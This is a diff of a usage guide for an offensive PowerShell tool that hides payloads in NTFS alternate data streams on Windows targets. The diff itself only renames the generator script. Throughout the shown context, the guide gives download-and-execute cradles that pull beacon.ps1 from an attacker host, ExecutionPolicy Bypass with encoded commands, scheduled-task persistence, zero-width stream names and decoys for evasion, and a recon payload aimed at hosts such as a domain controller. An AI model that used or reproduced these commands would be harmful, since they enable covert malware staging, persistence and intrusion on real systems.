@@ -1,4 +1,4 @@
-# ADS Deployment Usage Guide
+# ADS Deployment Usage Guide (Consider either combining with other help file, or naming each file clearly for scope)
 
 **Version:** 2.0.0 (Consolidated)  
 **Workflow:** Linux Generator → Windows Target  
@@ -15,7 +15,7 @@
 # sudo apt install powershell
 
 # Generate one-liner with payload baked in
-pwsh Build-ADSOneLiner.ps1 \
+pwsh ADS-OneLiner.ps1 \
   -Payload "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.5/beacon.ps1')" \
   -ZeroWidthMode single \
   -Persist task \
@@ -46,7 +46,7 @@ powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand <base64_string
 
 **On Linux:**
 ```bash
-pwsh Build-ADSOneLiner.ps1 \
+pwsh ADS-OneLiner.ps1 \
   -Payload 'Write-Host "Payload executed successfully"' \
   -ZeroWidthMode hybrid \
   -HybridPrefix "Zone.Identifier" \
@@ -101,7 +101,7 @@ powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABzAGMAcgBpAH
 
 **On Linux:**
 ```bash
-pwsh Build-ADSOneLiner.ps1 \
+pwsh ADS-OneLiner.ps1 \
   -PayloadAtDeployment \
   -ZeroWidthMode single \
   -Persist task \
@@ -133,7 +133,7 @@ IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.5/beacon.ps1')
 **On Linux:**
 ```bash
 # DC01 - Hybrid zero-width with heavy decoys
-pwsh Build-ADSOneLiner.ps1 \
+pwsh ADS-OneLiner.ps1 \
   -Payload $BEACON_PAYLOAD \
   -ZeroWidthMode hybrid \
   -CreateDecoys 5 \
@@ -142,7 +142,7 @@ pwsh Build-ADSOneLiner.ps1 \
   -OutputFile "payload-dc01.txt"
 
 # WEB01 - Single zero-width, minimal
-pwsh Build-ADSOneLiner.ps1 \
+pwsh ADS-OneLiner.ps1 \
   -Payload $BEACON_PAYLOAD \
   -ZeroWidthMode single \
   -Encrypt \
@@ -150,7 +150,7 @@ pwsh Build-ADSOneLiner.ps1 \
   -OutputFile "payload-web01.txt"
 
 # APP01 - Multi zero-width, no decoys
-pwsh Build-ADSOneLiner.ps1 \
+pwsh ADS-OneLiner.ps1 \
   -Payload $BEACON_PAYLOAD \
   -ZeroWidthMode multi \
   -Encrypt \
@@ -177,7 +177,7 @@ ls manifests/
 
 **On Linux:**
 ```bash
-pwsh Build-ADSOneLiner.ps1 \
+pwsh ADS-OneLiner.ps1 \
   -Payload 'whoami; ipconfig; net user' \
   -Persist none \
   -OutputFile "recon.txt"
@@ -196,7 +196,7 @@ powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ...
 
 ## 🔧 Parameter Reference
 
-### Build-ADSOneLiner.ps1 Parameters
+### ADS-OneLiner.ps1 Parameters
 
 | Parameter | Type | Default | Description |
 |-----------|------|---------|-------------|
@@ -217,7 +217,7 @@ powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ...
 
 ```
 Linux Machine (Kali)
-├── Build-ADSOneLiner.ps1        # Generator script
+├── ADS-OneLiner.ps1        # Generator script
 ├── ADS-Dropper.ps1               # (Optional) standalone version
 ├── ads-payload.txt               # Generated output
 └── manifests/                    # Manifest storage
@@ -251,7 +251,7 @@ Windows Target
   "PayloadHash": "A3F5B2C1D4E6F7...",
   "Operator": "kali",
   "GeneratedOn": "attacker-machine",
-  "GeneratedFrom": "/home/kali/ads/Build-ADSOneLiner.ps1",
+  "GeneratedFrom": "/home/kali/ads/ADS-OneLiner.ps1",
   "OutputFile": "payload-dc01.txt"
 }
 ```
